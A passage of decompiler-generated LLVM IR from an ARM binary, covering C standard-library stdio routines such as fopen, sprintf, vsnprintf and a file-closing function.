  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_13304 = load i32, i32* @r4, align 4
  store i32 %v3_13304, i32* %stack_var_-32, align 4
  %v6_13304 = load i32, i32* @r5, align 4
  %v9_13304 = load i32, i32* @r6, align 4
  %v12_13304 = load i32, i32* @r7, align 4
  %v15_13304 = load i32, i32* @r8, align 4
  %v2_13308 = add i32 %tmp, 52
  %v3_13308 = inttoptr i32 %v2_13308 to i32*
  %v4_13308 = load i32, i32* %v3_13308, align 4
  store i32 %v4_13308, i32* @r8, align 4
  %v2_1330c = add i32 %tmp, 56
  store i32 %v2_1330c, i32* @r5, align 4
  %v2_13310 = ptrtoint i32* %stack_var_-64 to i32
  %v2_13314 = icmp eq i32 %v4_13308, 0
  store i1 %v2_13314, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  %v2_13324 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_13324, i32* @r0, align 4
  br i1 %v2_13314, label %dec_label_pc_1332c, label %dec_label_pc_13348

dec_label_pc_1332c:                               ; preds = %entry
  store i32 94268, i32* %r3.global-to-local, align 4
  %v1_13334 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_17034.847 to i32), i32* %r3.global-to-local, align 4
  %v1_13344 = call i32 @__pthread_return_0()
  %v0_13348.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13348

dec_label_pc_13348:                               ; preds = %entry, %dec_label_pc_1332c
  %v0_13350 = phi i32 [ %tmp, %entry ], [ %v0_13348.pre, %dec_label_pc_1332c ]
  %v1_13348 = inttoptr i32 %v0_13350 to i8*
  %v2_13348 = load i8, i8* %v1_13348, align 1
  %v3_13348 = zext i8 %v2_13348 to i32
  %v1_1334c = and i32 %v3_13348, 64
  store i32 %v1_1334c, i32* %r3.global-to-local, align 4
  %v2_1334c = icmp eq i32 %v1_1334c, 0
  store i1 %v2_1334c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_1334c, i32* @r7, align 4
  br i1 %v2_1334c, label %dec_label_pc_13364, label %dec_label_pc_1335c

dec_label_pc_1335c:                               ; preds = %dec_label_pc_13348
  %v3_1335c = call i32 @fflush_unlocked(i8* %v1_13348)
  store i32 %v3_1335c, i32* @r7, align 4
  %v0_13364.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13364

dec_label_pc_13364:                               ; preds = %dec_label_pc_13348, %dec_label_pc_1335c
  %v0_13364 = phi i32 [ %v0_13350, %dec_label_pc_13348 ], [ %v0_13364.pre, %dec_label_pc_1335c ]
  %v1_13364 = add i32 %v0_13364, 4
  %v2_13364 = inttoptr i32 %v1_13364 to i32*
  %v3_13364 = load i32, i32* %v2_13364, align 4
  %v1_13368 = call i32 @__libc_close(i32 %v3_13364)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_13370 = icmp slt i32 %v1_13368, 0
  %v2_13370 = icmp eq i32 %v1_13368, 0
  store i1 %v2_13370, i1* %cpsr_z.global-to-local, align 1
  %v1_13374 = load i32, i32* @r4, align 4
  %v2_13374 = add i32 %v1_13374, 4
  %v3_13374 = inttoptr i32 %v2_13374 to i32*
  store i32 -1, i32* %v3_13374, align 4
  store i32 %v2_13310, i32* @r0, align 4
  br i1 %v1_13370, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_13364
  %v3_13388 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_13388, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_13364, %bb
  %v1_13394 = call i32 @__pthread_return_void()
  %v1_133a0 = call i32 @__pthread_return_0()
  %v2_133a8 = load i32, i32* @global_var_2a884.853, align 4
  %v1_133ac = add i32 %v2_133a8, 1
  store i32 %v1_133ac, i32* %r3.global-to-local, align 4
  store i32 %v1_133ac, i32* @global_var_2a884.853, align 4
  store i32 %v2_13310, i32* @r0, align 4
  %v1_133c4 = call i32 @__pthread_return_void()
  %v0_133c8 = load i32, i32* @r4, align 4
  %v1_133c8 = inttoptr i32 %v0_133c8 to i32*
  %v2_133c8 = load i32, i32* %v1_133c8, align 4
  %v1_133cc = and i32 %v2_133c8, 24576
  store i32 %v1_133cc, i32* %r3.global-to-local, align 4
  %v3_133d01 = udiv i32 %v1_133cc, 256
  %v1_133d4 = trunc i32 %v3_133d01 to i8
  %v3_133d4 = add i32 %v0_133c8, 1
  %v4_133d4 = inttoptr i32 %v3_133d4 to i8*
  store i8 %v1_133d4, i8* %v4_133d4, align 1
  %v0_133d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_133d8 = trunc i32 %v0_133d8 to i8
  %v2_133d8 = load i32, i32* @r4, align 4
  %v3_133d8 = inttoptr i32 %v2_133d8 to i8*
  store i8 %v1_133d8, i8* %v3_133d8, align 1
  %v0_133dc = load i32, i32* @r4, align 4
  %v1_133dc = inttoptr i32 %v0_133dc to i32*
  %v2_133dc = load i32, i32* %v1_133dc, align 4
  %v1_133e0 = or i32 %v2_133dc, 48
  store i32 %v1_133e0, i32* %r3.global-to-local, align 4
  %v3_133e4 = sdiv i32 %v2_133dc, 256
  %v0_133e8 = load i32, i32* @r8, align 4
  %v2_133e8 = icmp eq i32 %v0_133e8, 0
  store i1 %v2_133e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_13324, i32* @r0, align 4
  %v1_133f8 = trunc i32 %v3_133e4 to i8
  %v3_133f8 = add i32 %v0_133dc, 1
  %v4_133f8 = inttoptr i32 %v3_133f8 to i8*
  store i8 %v1_133f8, i8* %v4_133f8, align 1
  %v0_133fc = load i32, i32* %r3.global-to-local, align 4
  %v1_133fc = trunc i32 %v0_133fc to i8
  %v2_133fc = load i32, i32* @r4, align 4
  %v3_133fc = inttoptr i32 %v2_133fc to i8*
  store i8 %v1_133fc, i8* %v3_133fc, align 1
  %v0_13400 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13400, label %bb16, label %.thread

bb16:                                             ; preds = %bb15
  %v2_13404 = call i32 @__pthread_return_void()
  br label %.thread

.thread:                                          ; preds = %bb15, %bb16
  %v0_13408 = load i32, i32* @r4, align 4
  %v1_13408 = add i32 %v0_13408, 1
  %v2_13408 = inttoptr i32 %v1_13408 to i8*
  %v3_13408 = load i8, i8* %v2_13408, align 1
  %v4_13408 = zext i8 %v3_13408 to i32
  store i32 %v4_13408, i32* %r3.global-to-local, align 4
  %v1_1340c = and i32 %v4_13408, 64
  %v2_1340c = icmp eq i32 %v1_1340c, 0
  store i1 %v2_1340c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1340c, label %bb18, label %bb17

bb17:                                             ; preds = %.thread
  br label %bb18

bb18:                                             ; preds = %.thread, %bb17
  %v1_13414 = xor i1 %v2_1340c, true
  call void @__pseudo_cond_branch(i1 %v1_13414, i32 ptrtoint (i32* @global_var_15f30.855 to i32))
  store i32 %v2_13310, i32* @r0, align 4
  %v1_13428 = call i32 @__pthread_return_void()
  %v1_13434 = call i32 @__pthread_return_0()
  %v2_1343c = load i32, i32* @global_var_2a888.858, align 4
  %v1_13440 = add i32 %v2_1343c, 1
  store i32 %v1_13440, i32* %r3.global-to-local, align 4
  store i32 %v2_13310, i32* @r0, align 4
  store i32 %v1_13440, i32* @global_var_2a888.858, align 4
  %v1_13454 = call i32 @__pthread_return_void()
  %v1_13458 = call i32 @_stdio_openlist_dec_use(i32 %v1_13454)
  %v0_1345c = load i32, i32* @r7, align 4
  %v2_13464 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_13464, i32* @r4, align 4
  store i32 %v6_13304, i32* @r5, align 4
  store i32 %v9_13304, i32* @r6, align 4
  store i32 %v12_13304, i32* @r7, align 4
  store i32 %v15_13304, i32* @r8, align 4
  ret i32 %v0_1345c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_13364, { 1, 0 }
  uselistorder label %dec_label_pc_13348, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_1348c = call i32 @_stdio_fopen()
  ret i32 %v0_1348c
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_1349c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_1349c, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_134b0 = call i32 @__GI_vsnprintf()
  ret i32 %v0_134b0

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_134c4 = load i32, i32* @r4, align 4
  %v6_134c4 = load i32, i32* @r5, align 4
  %v12_134c4 = load i32, i32* @r7, align 4
  %v15_134c4 = load i32, i32* @r8, align 4
  %v18_134c4 = load i32, i32* @sl, align 4
  %v0_134c8 = load i32, i32* @r3, align 4
  store i32 %v0_134c8, i32* @r8, align 4
  %v2_134cc = ptrtoint i32* %stack_var_-108 to i32
  %v0_134d4 = load i32, i32* @r0, align 4
  %v1_134d4 = sub i32 -1, %v0_134d4
  store i32 %v1_134d4, i32* @r5, align 4
  store i32 %v0_134d4, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v1_134e8 = load i32, i32* @r1, align 4
  %v3_134e8 = icmp ult i32 %v1_134d4, %v1_134e8
  br i1 %v3_134e8, label %bb23, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_134e8, i32* @r5, align 4
  br label %bb23

bb23:                                             ; preds = %entry, %bb
  %v0_134f0 = load i32, i32* @r2, align 4
  store i32 %v0_134f0, i32* @r7, align 4
  %v2_134f4 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_134f4, i32* @r0, align 4
  store i32 208, i32* %stack_var_-108, align 4
  %v0_13510 = call i32 @__stdio_init_mutex()
  %v0_13514 = load i32, i32* @r4, align 4
  %v1_13514 = load i32, i32* @r5, align 4
  %v2_13514 = add i32 %v1_13514, %v0_13514
  %v0_1351c = load i32, i32* @r7, align 4
  %v0_13520 = load i32, i32* @r8, align 4
  %v0_1352c = load i32, i32* @sl, align 4
  %v12_13540 = inttoptr i32 %v0_1351c to i8*
  %v13_13540 = call i32 @_vfprintf_internal(i32 %v2_134cc, i8* %v12_13540, i32 %v0_13520, i32 %v2_13514, i32 %v0_13514, i32 %v2_13514, i32 %v0_13514, i32 %v0_13514, i32 %v0_13514, i32 %v2_13514, i32 %v0_1352c)
  %v0_13544 = load i32, i32* @r5, align 4
  %v1_13544 = load i32, i32* @sl, align 4
  %v9_13544 = icmp eq i32 %v0_13544, %v1_13544
  br i1 %v9_13544, label %dec_label_pc_1356c, label %dec_label_pc_13550

dec_label_pc_13550:                               ; preds = %bb23
  %v9_13558 = icmp eq i32 %v1_13514, 0
  %v1_1355c = sext i1 %v9_13558 to i32
  %v1_1355c.v0_13524 = add i32 %v0_13514, %v1_1355c
  %stack_var_-92.0 = inttoptr i32 %v1_1355c.v0_13524 to i8*
  %v1_13568 = trunc i32 %v1_13544 to i8
  store i8 %v1_13568, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_1356c

dec_label_pc_1356c:                               ; preds = %bb23, %dec_label_pc_13550
  store i32 %v3_134c4, i32* @r4, align 4
  store i32 %v6_134c4, i32* @r5, align 4
  store i32 %v12_134c4, i32* @r7, align 4
  store i32 %v15_134c4, i32* @r8, align 4
  store i32 %v18_134c4, i32* @sl, align 4
  ret i32 %v13_13540

; uselistorder directives
  uselistorder i32 %v1_13514, { 1, 0 }
  uselistorder i32 %v0_13514, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32 %v1_134e8, { 1, 0 }
  uselistorder i32 %v0_134d4, { 1, 0 }
  uselistorder label %dec_label_pc_1356c, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13574 = load i32, i32* @r4, align 4
  store i32 %v3_13574, i32* %stack_var_-24, align 4
  %v6_13574 = load i32, i32* @r5, align 4
  %v9_13574 = load i32, i32* @r6, align 4
  %v15_13574 = load i32, i32* @r8, align 4
  %v0_13578 = load i32, i32* @r1, align 4
  %v1_13578 = inttoptr i32 %v0_13578 to i8*
  %v2_13578 = load i8, i8* %v1_13578, align 1
  %v7_1357c = icmp eq i8 %v2_13578, 114
  store i1 %v7_1357c, i1* %cpsr_z.global-to-local, align 1
  %v2_13580 = ptrtoint i32* %stack_var_-56 to i32
  %v0_13584 = load i32, i32* @r0, align 4
  store i32 %v0_13584, i32* @r6, align 4
  %v0_13588 = load i32, i32* @r2, align 4
  store i32 %v0_13588, i32* @r8, align 4
  %v0_1358c = load i32, i32* @r3, align 4
  store i32 %v0_1358c, i32* @r5, align 4
  br i1 %v7_1357c, label %dec_label_pc_135d8, label %dec_label_pc_13594

dec_label_pc_13594:                               ; preds = %entry
  %v7_13594 = icmp eq i8 %v2_13578, 119
  store i1 %v7_13594, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13594, label %bb, label %dec_label_pc_135a0

bb:                                               ; preds = %dec_label_pc_13594
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_135dc

dec_label_pc_135a0:                               ; preds = %dec_label_pc_13594
  %v7_135a0 = icmp eq i8 %v2_13578, 97
  store i1 %v7_135a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_135a0, label %bb30, label %dec_label_pc_135ac

bb30:                                             ; preds = %dec_label_pc_135a0
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_135dc

dec_label_pc_135ac:                               ; preds = %dec_label_pc_135a0, %dec_label_pc_13664, %dec_label_pc_13638
  %v0_135ac = call i32 @__errno_location()
  store i32 %v0_135ac, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_135b4 = load i32, i32* @r8, align 4
  %v2_135b4 = icmp eq i32 %v0_135b4, 0
  store i1 %v2_135b4, i1* %cpsr_z.global-to-local, align 1
  %v2_135b8 = inttoptr i32 %v0_135ac to i32*
  store i32 22, i32* %v2_135b8, align 4
  br i1 %v2_135b4, label %dec_label_pc_1382c, label %dec_label_pc_135c0

dec_label_pc_135c0:                               ; preds = %dec_label_pc_13688._crit_edge, %dec_label_pc_135ac
  %v0_135c0 = load i32, i32* @r8, align 4
  %v1_135c0 = add i32 %v0_135c0, 1
  %v2_135c0 = inttoptr i32 %v1_135c0 to i8*
  %v3_135c0 = load i8, i8* %v2_135c0, align 1
  %v4_135c0 = zext i8 %v3_135c0 to i32
  store i32 %v4_135c0, i32* %r3.global-to-local, align 4
  %v1_135c4 = and i32 %v4_135c0, 32
  %v2_135c4 = icmp eq i32 %v1_135c4, 0
  store i1 %v2_135c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_135c4, label %dec_label_pc_1382c, label %dec_label_pc_135cc

dec_label_pc_135cc:                               ; preds = %dec_label_pc_135c0
  store i32 %v0_135c0, i32* @r0, align 4
  %v0_135d0 = call i32 @free()
  store i32 %v0_135d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1382c

dec_label_pc_135d8:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_135dc

dec_label_pc_135dc:                               ; preds = %bb, %bb30, %dec_label_pc_135d8
  %v1_135f4 = phi i32 [ 1089, %bb30 ], [ 577, %bb ], [ 1, %dec_label_pc_135d8 ]
  %v1_135dc = add i32 %v0_13578, 1
  %v2_135dc = inttoptr i32 %v1_135dc to i8*
  %v3_135dc = load i8, i8* %v2_135dc, align 1
  %v7_135e0 = icmp eq i8 %v3_135dc, 98
  store i1 %v7_135e0, i1* %cpsr_z.global-to-local, align 1
  %v1_135dc.v0_13578 = select i1 %v7_135e0, i32 %v1_135dc, i32 %v0_13578
  store i32 %v1_135dc.v0_13578, i32* %r3.global-to-local, align 4
  %v1_135ec = add i32 %v1_135dc.v0_13578, 1
  %v2_135ec = inttoptr i32 %v1_135ec to i8*
  %v3_135ec = load i8, i8* %v2_135ec, align 1
  %v4_135ec = zext i8 %v3_135ec to i32
  store i32 %v4_135ec, i32* %r3.global-to-local, align 4
  %v7_135f0 = icmp eq i8 %v3_135ec, 43
  store i1 %v7_135f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_135f0, label %bb33, label %.thread4

bb33:                                             ; preds = %dec_label_pc_135dc
  store i32 %v1_135f4, i32* %r3.global-to-local, align 4
  %v2_135f8 = add nuw nsw i32 %v1_135f4, 1
  store i32 %v2_135f8, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_135dc, %bb33
  %v2_135fc = icmp eq i32 %v0_13588, 0
  store i1 %v2_135fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_135fc, label %dec_label_pc_13604, label %dec_label_pc_13630

dec_label_pc_13604:                               ; preds = %.thread4
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_13608 = call i32 @malloc(i32 80)
  store i32 %v1_13608, i32* %r0.global-to-local, align 4
  store i32 %v1_13608, i32* @r8, align 4
  %v3_1360c = icmp eq i32 %v1_13608, 0
  store i1 %v3_1360c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1360c, label %dec_label_pc_13830, label %dec_label_pc_13614

dec_label_pc_13614:                               ; preds = %dec_label_pc_13604
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v3_1361c = add i32 %v1_13608, 1
  %v4_1361c = inttoptr i32 %v3_1361c to i8*
  store i8 32, i8* %v4_1361c, align 1
  %v0_13620 = load i32, i32* %r2.global-to-local, align 4
  %v1_13620 = load i32, i32* @r8, align 4
  %v2_13620 = add i32 %v1_13620, 8
  %v3_13620 = inttoptr i32 %v2_13620 to i32*
  store i32 %v0_13620, i32* %v3_13620, align 4
  %v0_13624 = load i32, i32* %r2.global-to-local, align 4
  %v1_13624 = trunc i32 %v0_13624 to i8
  %v2_13624 = load i32, i32* @r8, align 4
  %v3_13624 = inttoptr i32 %v2_13624 to i8*
  store i8 %v1_13624, i8* %v3_13624, align 1
  %v0_13628 = load i32, i32* @r8, align 4
  %v1_13628 = add i32 %v0_13628, 56
  store i32 %v1_13628, i32* @r0, align 4
  %v0_1362c = call i32 @__stdio_init_mutex()
  store i32 %v0_1362c, i32* %r0.global-to-local, align 4
  %v0_13630.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13630

dec_label_pc_13630:                               ; preds = %.thread4, %dec_label_pc_13614
  %v0_13688 = phi i32 [ %v0_1358c, %.thread4 ], [ %v0_13630.pre, %dec_label_pc_13614 ]
  %v1_13630 = icmp slt i32 %v0_13688, 0
  %v2_13630 = icmp eq i32 %v0_13688, 0
  store i1 %v2_13630, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_13630, label %dec_label_pc_13688, label %dec_label_pc_13638

dec_label_pc_13638:                               ; preds = %dec_label_pc_13630
  %v0_1363c = load i32, i32* @r4, align 4
  %v2_1363c = and i32 %v0_1363c, 131075
  %v1_13640 = add nuw nsw i32 %v2_1363c, 1
  store i32 %v1_13640, i32* %r2.global-to-local, align 4
  %v0_13644 = load i32, i32* @r6, align 4
  %v1_13644 = add i32 %v0_13644, 1
  %v2_13648 = and i32 %v1_13644, %v1_13640
  store i32 %v2_13648, i32* %r3.global-to-local, align 4
  %v9_1364c = icmp eq i32 %v2_13648, %v1_13640
  store i1 %v9_1364c, i1* %cpsr_z.global-to-local, align 1
  %v1_13650 = load i32, i32* @r8, align 4
  %v2_13650 = add i32 %v1_13650, 4
  %v3_13650 = inttoptr i32 %v2_13650 to i32*
  store i32 %v0_13688, i32* %v3_13650, align 4
  br i1 %v9_1364c, label %dec_label_pc_13658, label %dec_label_pc_135ac

dec_label_pc_13658:                               ; preds = %dec_label_pc_13638
  %v0_13658 = load i32, i32* @r4, align 4
  %v1_13658 = load i32, i32* @r6, align 4
  %v2_13658 = sub i32 -1, %v1_13658
  %v3_13658 = and i32 %v0_13658, %v2_13658
  store i32 %v3_13658, i32* %r3.global-to-local, align 4
  %v1_1365c = and i32 %v3_13658, 1024
  %v2_1365c = icmp eq i32 %v1_1365c, 0
  store i1 %v2_1365c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1365c, label %dec_label_pc_1367c, label %dec_label_pc_13664

dec_label_pc_13664:                               ; preds = %dec_label_pc_13658
  %v0_13664 = load i32, i32* @r5, align 4
  store i32 %v0_13664, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_13670 = call i32 @__libc_fcntl(i32 %v0_13664, i32 4)
  store i32 %v2_13670, i32* %r0.global-to-local, align 4
  %v2_13674 = icmp eq i32 %v2_13670, 0
  store i1 %v2_13674, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13674, label %dec_label_pc_13664.dec_label_pc_1367c_crit_edge, label %dec_label_pc_135ac

dec_label_pc_13664.dec_label_pc_1367c_crit_edge:  ; preds = %dec_label_pc_13664
  %v0_1367c.pre = load i32, i32* @r6, align 4
  %v0_13680.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1367c

dec_label_pc_1367c:                               ; preds = %dec_label_pc_13664.dec_label_pc_1367c_crit_edge, %dec_label_pc_13658
  %v0_13680 = phi i32 [ %v0_13680.pre, %dec_label_pc_13664.dec_label_pc_1367c_crit_edge ], [ %v0_13658, %dec_label_pc_13658 ]
  %v0_1367c = phi i32 [ %v0_1367c.pre, %dec_label_pc_13664.dec_label_pc_1367c_crit_edge ], [ %v1_13658, %dec_label_pc_13658 ]
  %v1_1367c = and i32 %v0_1367c, 131072
  store i32 %v1_1367c, i32* %r3.global-to-local, align 4
  %v2_13680 = or i32 %v1_1367c, %v0_13680
  store i32 %v2_13680, i32* @r4, align 4
  br label %dec_label_pc_136ac

dec_label_pc_13688:                               ; preds = %dec_label_pc_13630
  %v7_13688 = icmp eq i32 %v0_13688, -1
  store i1 %v7_13688, i1* %cpsr_z.global-to-local, align 1
  %v0_13694.pre = load i32, i32* @r4, align 4
  br i1 %v7_13688, label %dec_label_pc_13688._crit_edge, label %bb34

bb34:                                             ; preds = %dec_label_pc_13688
  %v2_1368c = or i32 %v0_13694.pre, 131072
  store i32 %v2_1368c, i32* @r4, align 4
  br label %dec_label_pc_13688._crit_edge

dec_label_pc_13688._crit_edge:                    ; preds = %dec_label_pc_13688, %bb34
  %v0_13694 = phi i32 [ %v2_1368c, %bb34 ], [ %v0_13694.pre, %dec_label_pc_13688 ]
  %v0_13690 = load i32, i32* @r6, align 4
  store i32 %v0_13690, i32* %r0.global-to-local, align 4
  store i32 %v0_13694, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_1369c = inttoptr i32 %v0_13690 to i8*
  %v3_1369c = call i32 @__libc_open(i8* %v2_1369c, i32 %v0_13694)
  store i32 %v3_1369c, i32* %r0.global-to-local, align 4
  %v1_136a0 = icmp slt i32 %v3_1369c, 0
  %v2_136a0 = icmp eq i32 %v3_1369c, 0
  store i1 %v2_136a0, i1* %cpsr_z.global-to-local, align 1
  %v1_136a4 = load i32, i32* @r8, align 4
  %v2_136a4 = add i32 %v1_136a4, 4
  %v3_136a4 = inttoptr i32 %v2_136a4 to i32*
  store i32 %v3_1369c, i32* %v3_136a4, align 4
  br i1 %v1_136a0, label %dec_label_pc_135c0, label %dec_label_pc_136ac

dec_label_pc_136ac:                               ; preds = %dec_label_pc_13688._crit_edge, %dec_label_pc_1367c
  %v0_136ac = load i32, i32* @r8, align 4
  %v1_136ac = inttoptr i32 %v0_136ac to i32*
  %v2_136ac = load i32, i32* %v1_136ac, align 4
  %v1_136b0 = and i32 %v2_136ac, 8192
  store i32 %v1_136b0, i32* %r3.global-to-local, align 4
  %v3_136b41 = udiv i32 %v1_136b0, 256
  store i32 %v3_136b41, i32* %r2.global-to-local, align 4
  %v1_136b8 = trunc i32 %v3_136b41 to i8
  %v3_136b8 = add i32 %v0_136ac, 1
  %v4_136b8 = inttoptr i32 %v3_136b8 to i8*
  store i8 %v1_136b8, i8* %v4_136b8, align 1
  %v0_136bc = load i32, i32* %r3.global-to-local, align 4
  %v1_136bc = trunc i32 %v0_136bc to i8
  %v2_136bc = load i32, i32* @r8, align 4
  %v3_136bc = inttoptr i32 %v2_136bc to i8*
  store i8 %v1_136bc, i8* %v3_136bc, align 1
  %v0_136c0 = load i32, i32* @r4, align 4
  %v1_136c0 = and i32 %v0_136c0, 131072
  store i32 %v1_136c0, i32* %r1.global-to-local, align 4
  %v2_136c0 = icmp eq i32 %v1_136c0, 0
  store i1 %v2_136c0, i1* %cpsr_z.global-to-local, align 1
  %v0_136c4 = load i32, i32* @r8, align 4
  %v1_136c4 = add i32 %v0_136c4, 1
  %v2_136c4 = inttoptr i32 %v1_136c4 to i8*
  %v3_136c4 = load i8, i8* %v2_136c4, align 1
  %v4_136c4 = zext i8 %v3_136c4 to i32
  %v1_136c8 = inttoptr i32 %v0_136c4 to i8*
  %v2_136c8 = load i8, i8* %v1_136c8, align 1
  %v3_136c8 = zext i8 %v2_136c8 to i32
  store i32 %v3_136c8, i32* %r3.global-to-local, align 4
  br i1 %v2_136c0, label %bb36, label %bb35

bb35:                                             ; preds = %dec_label_pc_136ac
  store i32 32768, i32* %r1.global-to-local, align 4
  br label %bb36

bb36:                                             ; preds = %dec_label_pc_136ac, %bb35
  %v0_136dc = phi i32 [ 0, %dec_label_pc_136ac ], [ 32768, %bb35 ]
  %v1_136d0 = and i32 %v0_136c0, 1024
  store i32 %v1_136d0, i32* %r0.global-to-local, align 4
  %v4_136d8 = mul nuw nsw i32 %v4_136c4, 256
  %v5_136d8 = or i32 %v3_136c8, %v4_136d8
  %v2_136dc = or i32 %v0_136dc, %v1_136d0
  store i32 %v2_136dc, i32* %r1.global-to-local, align 4
  %v2_136e4 = or i32 %v5_136d8, %v2_136dc
  %v1_136d4 = mul i32 %v0_136c0, 16
  %v1_136e0 = and i32 %v1_136d4, 48
  %v1_136e8 = add nuw nsw i32 %v1_136e0, 16
  %v4_136ec = xor i32 %v1_136e8, 48
  %v5_136ec = or i32 %v2_136e4, %v4_136ec
  store i32 %v5_136ec, i32* %r3.global-to-local, align 4
  %v3_136f019 = udiv i32 %v2_136e4, 256
  store i32 %v3_136f019, i32* %r2.global-to-local, align 4
  %v1_136f4 = trunc i32 %v3_136f019 to i8
  store i8 %v1_136f4, i8* %v2_136c4, align 1
  %v0_136f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_136f8 = trunc i32 %v0_136f8 to i8
  %v2_136f8 = load i32, i32* @r8, align 4
  %v3_136f8 = inttoptr i32 %v2_136f8 to i8*
  store i8 %v1_136f8, i8* %v3_136f8, align 1
  %v0_136fc = call i32 @__errno_location()
  store i32 %v0_136fc, i32* %r0.global-to-local, align 4
  %v0_13700 = load i32, i32* @r8, align 4
  %v1_13700 = add i32 %v0_13700, 1
  %v2_13700 = inttoptr i32 %v1_13700 to i8*
  %v3_13700 = load i8, i8* %v2_13700, align 1
  %v4_13700 = zext i8 %v3_13700 to i32
  store i32 %v4_13700, i32* %r3.global-to-local, align 4
  %v1_13704 = inttoptr i32 %v0_13700 to i8*
  %v2_13704 = load i8, i8* %v1_13704, align 1
  %v3_13704 = zext i8 %v2_13704 to i32
  store i32 %v0_136fc, i32* @r6, align 4
  %v1_1370c = add i32 %v0_13700, 4
  %v2_1370c = inttoptr i32 %v1_1370c to i32*
  %v3_1370c = load i32, i32* %v2_1370c, align 4
  store i32 %v3_1370c, i32* @r0, align 4
  %v4_13710 = mul nuw nsw i32 %v4_13700, 256
  %v5_13710 = or i32 %v3_13704, %v4_13710
  store i32 %v5_13710, i32* @r4, align 4
  %v1_13714 = inttoptr i32 %v0_136fc to i32*
  %v2_13714 = load i32, i32* %v1_13714, align 4
  store i32 %v2_13714, i32* @r5, align 4
  %v1_13718 = call i32 @isatty(i32 %v3_1370c)
  store i32 %v1_13718, i32* %r0.global-to-local, align 4
  %v0_1371c = load i32, i32* @r4, align 4
  %v4_1371c = mul i32 %v1_13718, 256
  %v5_1371c = or i32 %v0_1371c, %v4_1371c
  store i32 %v5_1371c, i32* @r4, align 4
  %v3_13720 = sdiv i32 %v5_1371c, 256
  store i32 %v3_13720, i32* %r3.global-to-local, align 4
  %v1_13724 = trunc i32 %v3_13720 to i8
  %v2_13724 = load i32, i32* @r8, align 4
  %v3_13724 = add i32 %v2_13724, 1
  %v4_13724 = inttoptr i32 %v3_13724 to i8*
  store i8 %v1_13724, i8* %v4_13724, align 1
  %v0_13728 = load i32, i32* @r4, align 4
  %v1_13728 = trunc i32 %v0_13728 to i8
  %v2_13728 = load i32, i32* @r8, align 4
  %v3_13728 = inttoptr i32 %v2_13728 to i8*
  store i8 %v1_13728, i8* %v3_13728, align 1
  %v0_1372c = load i32, i32* @r5, align 4
